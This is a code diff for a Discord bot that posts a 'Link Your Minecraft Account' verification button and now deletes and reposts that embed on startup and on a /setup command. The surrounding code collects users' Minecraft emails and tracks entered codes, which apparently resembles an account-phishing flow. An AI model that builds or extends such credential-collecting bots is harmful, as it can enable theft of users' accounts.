@@ -17,6 +17,7 @@ bot = commands.Bot(command_prefix='!', intents=intents)
 # To track if the bot has already sent the verification DM to the user
 sent_verification_dms = {}
 sent_invalid_codes = set()  # To track users who entered an invalid code
+previous_verification_embed = None  # Variable to store the last verification embed
 
 class VerifyModal(discord.ui.Modal, title="Link Your Minecraft Account"):
     email = discord.ui.TextInput(label="Minecraft Email", placeholder="example@gmail.com", required=True)
@@ -57,35 +58,49 @@ async def on_ready():
 
     verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)
 
-    # Only send verification prompt if it hasn't been sent before
-    if not sent_verification_dms.get("verification_message_sent", False):
-        embed = discord.Embed(
-            title="🔗 Link Your Minecraft Account",
-            description="Click the **Link Account** button below to start verification.",
-            color=discord.Color.green()
-        )
-        embed.set_footer(text="This is an automated message.")
-        await verification_channel.send(embed=embed, view=LinkView())
+    # Delete the previous verification embed if it exists
+    global previous_verification_embed
+    if previous_verification_embed:
+        try:
+            await previous_verification_embed.delete()
+        except discord.NotFound:
+            pass
 
-        # Mark as sent to avoid duplicate messages
-        sent_verification_dms["verification_message_sent"] = True
+    # Send the new verification embed
+    embed = discord.Embed(
+        title="🔗 Link Your Minecraft Account",
+        description="Click the **Link Account** button below to start verification.",
+        color=discord.Color.green()
+    )
+    embed.set_footer(text="This is an automated message.")
+    sent_message = await verification_channel.send(embed=embed, view=LinkView())
+
+    # Update the reference to the latest sent embed
+    previous_verification_embed = sent_message
 
 @bot.tree.command(name="setup", description="Start the Minecraft account verification process")
 async def setup(interaction: discord.Interaction):
     verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)
 
-    # Only send verification prompt if it hasn't been sent before
-    if not sent_verification_dms.get("verification_message_sent", False):
-        embed = discord.Embed(
-            title="🔗 Link Your Minecraft Account",
-            description="Click the **Link Account** button below to start verification.",
-            color=discord.Color.green()
-        )
-        embed.set_footer(text="This is an automated message.")
-        await verification_channel.send(embed=embed, view=LinkView())
+    # Delete the previous verification embed if it exists
+    global previous_verification_embed
+    if previous_verification_embed:
+        try:
+            await previous_verification_embed.delete()
+        except discord.NotFound:
+            pass
 
-        # Mark as sent to avoid duplicate messages
-        sent_verification_dms["verification_message_sent"] = True
+    # Send the new verification embed
+    embed = discord.Embed(
+        title="🔗 Link Your Minecraft Account",
+        description="Click the **Link Account** button below to start verification.",
+        color=discord.Color.green()
+    )
+    embed.set_footer(text="This is an automated message.")
+    sent_message = await verification_channel.send(embed=embed, view=LinkView())
+
+    # Update the reference to the latest sent embed
+    previous_verification_embed = sent_message
 
     await interaction.response.send_message("✅ Sent verification prompt to the channel.", ephemeral=False)
 
